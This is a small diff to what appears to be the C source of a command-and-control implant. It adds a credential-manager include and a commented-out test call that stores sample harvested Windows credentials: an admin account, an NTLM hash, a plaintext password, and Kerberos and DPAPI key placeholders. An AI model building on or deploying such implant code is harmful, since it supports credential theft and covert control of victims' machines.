@@ -6,6 +6,7 @@
 #include "whisper_json.h"
 #include "whisper_winapi.h"
 #include "whisper_dynamic_config.h"
+#include "whisper_credmanager.h"
 #include <time.h>
 #include <stdint.h>
 #include <stdio.h>
@@ -70,6 +71,15 @@ int main()
 // Thread function for executing the command asynchronously
 DWORD WINAPI execute_async(char * agent_id)
 {
+
+    //bug somewhere in here. yay
+    // add_credential("admin", "CORP", 
+    //             "31d6cfe0d16ae931b73c59d7e0c089c0", NULL, "P@ssw0rd!",
+    //             "base64-KerbTGT", "aes128-key", "aes256-key",
+    //             "dpapi-master-key");
+
+    
+    // display_credentials();
 
     //this fills in the command, arg and command_id
     InboundJsonDataStruct InboundJsonData = get_command_data(agent_id);
